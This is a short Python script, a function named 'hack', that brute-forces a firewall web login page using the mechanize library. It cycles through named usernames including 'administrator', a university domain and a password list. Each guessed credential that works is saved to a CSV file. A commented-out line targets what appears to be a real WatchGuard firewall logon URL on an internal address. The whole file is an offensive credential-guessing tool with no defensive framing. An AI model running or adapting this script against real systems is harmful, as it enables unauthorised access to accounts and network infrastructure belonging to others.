import mechanize

ids = ['administrator', 'md1209', 'md1207']
domains = ['rasetcentral.edu', 'Firebox-DB']
success = 0


def hack():
    global ids, success, domains
    plist = ['123', '234']#open('pfile.txt', 'r').read().split(',')
    for dom in domains:
        for id in ids:
            for p in plist:
                browser = mechanize.Browser()
                browser.set_handle_robots(False)
                # browser.open("https://192.168.2.254:4100/wgcgi.cgi?action=fw_logon&style=fw_logon.xsl&fw_logon_type=status&redirect=http://192.168.0.66/")
                browser.open('http://localhost/firewall/User%20Authentication.htm')
                browser.select_form(nr=0)
                browser.form["fw_username"] = id
                browser.form["fw_password"] = p
                #browser.form["fw_domain"] = str(dom)
                r = browser.submit()
                print r.read()
                if 'You have been successfully authenticated.' in str(r.read()):
                    tocsv(id, p)
                    success += 1
                    break
            print success


def tocsv(id, passw):
    f = open('p.csv', 'a')
    f.write(id + ", " + passw)
    f.write("\n")
    f.close()


if __name__ == '__main__':
    hack()
